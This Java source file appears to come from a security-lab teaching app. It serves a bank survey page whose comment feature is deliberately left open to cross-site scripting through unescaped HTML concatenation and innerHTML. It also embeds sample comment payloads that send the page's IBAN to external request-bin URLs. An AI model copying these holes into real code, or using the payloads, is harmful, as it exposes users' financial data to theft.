package ch.zhaw.securitylab.diba.server.controllers;

import java.util.ArrayList;
import ch.zhaw.securitylab.diba.server.Server;
import ch.zhaw.securitylab.diba.server.MySQLHelper;
import io.javalin.http.Context;
import io.javalin.http.Handler;
import java.sql.Connection;
import java.text.*;
import java.util.Calendar;
import java.util.Date;

import static ch.zhaw.securitylab.diba.server.util.Decode.fetchJSON;

public class ControllerSurvey extends ControllerParent {

	private static String html1 = "<html>"
								+ "	<head>"
								+ "		<!-- JS -->"
								+ "		<!--<script type='text/javascript' src='main.js'></script>-->"
								+ "     <script>\n"
								+ "        var post_comment = function() {"
								+ "           var m = document.getElementById('comment').value;"
							    + "           var xmlhttp = new XMLHttpRequest();"
							    + "           xmlhttp.onload = function() {"
								+ "              if (xmlhttp.readyState === 4) {"
								+ "			        if (xmlhttp.status === 200) {"
								+ "		               var comments = document.getElementById('comments');"
								+ "                    var today = new Date();"
	                            + "                    var dd = String(today.getDate()).padStart(2, '0');"
	                            + "                    var mm = String(today.getMonth() + 1).padStart(2, '0');"
	                            + "                    var yyyy = today.getFullYear();"
	                            + "                    today = dd + '-' + mm + '-' + yyyy;"
                                + "                    var comment = \"<div style='padding:5px;'><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px;word-wrap:break-word;'><div style='border-bottom:1px solid #adadad;margin-bottom:10px;'>\"+today+\"</div>\"+m+\"</div></div>\";"
								+ "                    console.log(comments);"
								+ "                    console.log(comment);"
								+ "                    comments.innerHTML += comment;"
								+ "                 }\n"
								+ "              }\n"
								+ "           }\n"
                                + "           xmlhttp.open('POST', '/comment');"
                                + "           xmlhttp.setRequestHeader('Content-Type', 'application/json');"
                                + "           xmlhttp.send(JSON.stringify({ 'comment': m }));"
								+ "        }\n"
								+ "     </script>\n"
								+ "	</head>\n"
								+ "	<body style='font-family:arial;color:#3c3c3c'>"
								+ "		<div class='container' style='margin:20px 20px 20px 20px;text-align:left'>"
								+ "		<h1 style='color:#ef2633'>Survey</h1>"
								+ "		<p style='border:1px solid #666;padding:5px;border-radius:3px;width:100%;'>"
								+ "         You recently open account IBAN:</br> <a id='iban'>CH48123456789</a>"
								+ "     </p>"
								+ "		<div style='width:100%;'>"
								+ "		    <label for='score'>Please, let us know you think. Give us a comment and score our service from 1 (bad) to 5 (good):</label>"
								+ "			<select name='service' id='score' style='width:100%;margin-top:10px;padding:5px;font-family:inherit;font-size:inherit'>"
								+ "			  <option value='1'>1</option>"
								+ "			  <option value='2'>2</option>" 
								+ "			  <option value='3'>3</option>"
								+ "			  <option value='4'>4</option>"
								+ "			  <option value='5'>5</option>"
								+ "			</select><br>"
								+ "			<textarea id='comment' style='margin-top:30px;width:100%;height:125px;font-family:inherit;font-size:inherit;' name='comment' form='commentForm' type='text' placeholder='Insert your comment here...'></textarea></br>"
								+ "         <button onclick='post_comment()' style='margin-top:10px;float:right;padding:10px;color:white;background-color:#2196f3;border:none;border-radius:5px;cursor:pointer;font-size:12pt;'>POST COMMENT</button>"
								+ "		</div>"
								+ "		<!-- comments from other users -->";


	private static String html2 = " <div id='comments' style='display:inline-block;text-align:left;'>"
								+ "			<h3>Comments:</h3>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>Thank you! I won the prize :D</div>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>AHAHA I have your IBAN :D<script>new Image().src = encodeURI(\"https://postb.in/1593853304607-7301555383019?iban=\"+document.getElementById(\"iban\").text);</script>"
								+ "			</div>"
								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>WHHHHHHU Thank you! I won the prize :D"
								+ "         <img src='https://postb.in/1594074379438-2416828356217?iban='+document.getElementById(\"iban\").text/>"
								+ "		    </div>"
								+ "	</div>"
								+ "	</div>"
								+ "	</body>"
								+ "</html>";

	public static String buildHtml(ArrayList<String> comments) {
		String surveyHtml = html1;
		surveyHtml += "<div id='comments' style='display:inline-block;text-align:left;'>"
					+ "<h3>Comments:</h3>";
		DateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy");
		String today = dateFormat.format(Calendar.getInstance().getTime());
		for (int i=0; i<comments.size(); i++) {
			surveyHtml += "<div style='padding:5px;'><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px;word-wrap:break-word;'><div style='border-bottom:1px solid #adadad;margin-bottom:10px;'>"+today+"</div>"+comments.get(i)+"</div></div>";
		}
		return surveyHtml;
	}

	//public static Handler handleLoginPost = context -> {
	public static Handler handleSurveyGet = context -> {
		Server.logger.info("Survey started");
		MySQLHelper.getDatabaseConnection();
		ArrayList<String> comments = MySQLHelper.get_comments();
		String surveyHtml = buildHtml(comments);
		context.html(surveyHtml);
		
	};

	public static Handler handleSurveyGetAction = context -> {
		String m = fetchJSON(context,"comment");
		MySQLHelper.add_comment(m);
		context.html("<h1>Your comment was posted!</h1><p>"+m+"</p>");
		Server.logger.info("Comment added "+m);
	};
}
